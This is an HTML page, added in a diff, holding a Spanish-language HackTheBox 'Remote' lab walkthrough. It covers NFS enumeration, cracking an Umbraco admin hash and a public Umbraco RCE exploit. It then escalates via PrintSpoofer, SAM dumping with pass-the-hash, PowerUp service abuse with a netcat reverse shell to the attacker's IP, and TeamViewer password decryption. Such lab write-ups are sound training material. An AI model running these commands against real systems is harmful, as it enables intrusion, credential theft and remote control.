@@ -1,0 +1,191 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Remote HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/remote/pasted-20260317135659.png" alt="Remote HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Remote</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>impersonación</span>
+            <span>PrintSpoofer</span>
+            <span>nfs</span>
+            <span>umbraco</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: NFS expone ficheros de Umbraco CMS</li>
+            <li><code>Explotación</code>: Credenciales extraídas del contenido NFS y RCE autenticado en Umbraco</li>
+            <li><code>Escalada de Privilegios</code>: <code>SeImpersonatePrivilege</code> mediante PrintSpoofer</li>
+            <li><code>Escalada de Privilegios</code>: Servicios vulnerables detectados con PowerUp y TeamViewer</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318015124.png" alt="Remote HTB" />
+          <div class="code-card">
+            <h3>Fuzzing web</h3>
+            <pre><code>gobuster dir -u http://remote -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50
+# CMS: Umbraco</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318015148.png" alt="Remote HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación NFS</h2>
+          <div class="code-card">
+            <h3>Leer ficheros compartidos del NFS</h3>
+            <pre><code>showmount -e remote</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318013750.png" alt="Remote HTB" />
+          <div class="code-card">
+            <h3>Extraer ficheros</h3>
+            <pre><code>mkdir /mnt/remote_htb
+mount -t nfs remote:/site_backups /mnt/remote_htb</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318013810.png" alt="Remote HTB" />
+          <div class="code-card">
+            <h3>Buscar credenciales </h3>
+            <pre><code>strings App_Data/Umbraco.sdf
+# HASH_SHA1</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318014856.png" alt="Remote HTB" />
+          <div class="code-card">
+            <h3>Crackear Hash</h3>
+            <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Hash: b8be16afba8c314ad33d812f22a04991b90e2aaa
+# Credenciales: admin@htb.local:baconandcheese</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318015108.png" alt="Remote HTB" />
+          <div class="code-card">
+            <h3>Comandos</h3>
+            <pre><code># Validar credenciales</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318015408.png" alt="Remote HTB" />
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318015338.png" alt="Remote HTB" />
+          <p>Con credenciales aprovechamos vulnerabilidad del CMS para ganar acceso. (Buscamos en google Umbraco exploits GitHub)</p>
+          <p><a href="https://github.com/Jonoans/Umbraco-RCE">Exploit GitHub</a></p>
+          <div class="code-card">
+            <h3>Exploit</h3>
+            <pre><code>python exploit.py -u admin@htb.local -p baconandcheese -w http://remote -i 10.10.16.69</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318022452.png" alt="Remote HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Impersonate</h2>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318022520.png" alt="Remote HTB" />
+          <div class="code-card">
+            <h3>Impersonate</h3>
+            <pre><code>\\10.10.16.69\SMB\PrintSpoofer.exe -c "net user add alvaro ruyz123$! /add"
+
+\\10.10.16.69\SMB\PrintSpoofer.exe -c "net localgroup Administrators alvaro /add"
+
+\\10.10.16.69\SMB\PrintSpoofer.exe -c "reg add  HKLM\Software\Microsoft\Windows\Currentversión\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318023226.png" alt="Remote HTB" />
+          <div class="code-card">
+            <h3>Comandos</h3>
+            <pre><code>nxc SMB remote -u alvaro -p 'ruyz123$!' --sam</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318023412.png" alt="Remote HTB" />
+          <div class="code-card">
+            <h3>Acceso PSEXEC</h3>
+            <pre><code>impacket-psexec administrator@remote -hashes :86fc053bc0b23588798277b22540c40c</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318023404.png" alt="Remote HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Servicios con PowerUp</h2>
+          <div class="code-card">
+            <h3>Lanzar PowerUp</h3>
+            <pre><code>copy \\10.10.16.69\SMB\PowerUp.ps1 .
+. .\PowerUp.ps1
+Invoke-AllChecks</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318143730.png" alt="Remote HTB" />
+          <div class="code-card">
+            <h3>Payloads (Todos escalan privilegios)</h3>
+            <pre><code># Payload 1: Crear usuario john y lo añade local_admin
+Invoke-ServiceAbuse -ServiceName 'UsoSvc'
+
+# Payload 2: Ejecutar nc.exe
+Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command "C:\windows\temp\prives\nc.exe 10.10.16.69 443 -e cmd.exe"
+
+# Payload 3: Modificar Path para ejecutar nc.exe o un backdoor con msfvenom
+# PowerShell Enumera Path del servicio UsoSvc
+Get-WMIObject -Class win32_service | Where-Object {$_.Name -eq "UsoSvc"} | Select-Object *
+# CMD Enumera Path del servicio UsoSvc
+sc.exe qc UsoSvc
+# Modificar Path
+sc.exe config UsoSvc binpath="C:\windows\temp\prives\nc.exe 10.10.16.69 443 -e cmd.exe"
+# Reiniciar servicio
+sc.exe stop UsoSvc
+sc.exe start UsoSvc</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318165407.png" alt="Remote HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Servicio TeamViewer vulnerable</h2>
+          <div class="code-card">
+            <h3>Enumerar procesos relacionados a servicios</h3>
+            <pre><code>tasklist /svc</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318234523.png" alt="Remote HTB" />
+          <div class="code-card">
+            <h3>Sin usar metasploit, enumeramos un módulo sobre Teamviewer</h3>
+            <pre><code>locate teamviewer
+bat /usr/share/metasploit-framework/modules/post/windows/gather/credentials/teamviewer_passwords.rb</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318234707.png" alt="Remote HTB" />
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318234721.png" alt="Remote HTB" />
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318234815.png" alt="Remote HTB" />
+          <div class="code-card">
+            <h3>Enumerar Registro</h3>
+            <pre><code>reg query HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\versión7</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260318235101.png" alt="Remote HTB" />
+          <p>[CyberChef]()</p>
+          <div class="code-card">
+            <h3>Desencriptar contraseña</h3>
+            <pre><code># key 
+\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00
+# iv
+\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04
+# aes
+FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
+# Contraseña: !R3m0te!</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260319000034.png" alt="Remote HTB" />
+          <img class="writeup-image" src="/writeups/assets/remote/pasted-20260319000303.png" alt="Remote HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>impersonación</span>
+            <span>PrintSpoofer</span>
+            <span>nfs</span>
+            <span>umbraco</span>
+            <span>servicios</span>
+            <span>powerup</span>
+            <span>procesos</span>
+            <span>teamviewer</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
